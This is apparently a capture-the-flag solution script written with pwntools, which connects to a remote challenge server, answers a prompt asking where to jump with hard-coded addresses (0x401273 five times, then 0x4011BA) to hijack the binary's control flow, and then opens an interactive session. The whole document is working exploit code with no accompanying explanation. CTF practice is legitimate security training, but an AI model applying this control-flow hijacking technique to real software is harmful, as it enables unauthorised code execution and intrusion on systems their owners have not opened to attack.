from pwn import *

binary = './chall'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
# r = process(binary)
r = remote('kashictf.iitbhucybersec.in', 45935)

r.recvuntil(b'i like to jump where ever you say \r\ngive me the address to go : ')
for i in range(5):
    r.sendline(hex(0x401273))

r.sendline(hex(0x4011BA))
r.interactive()
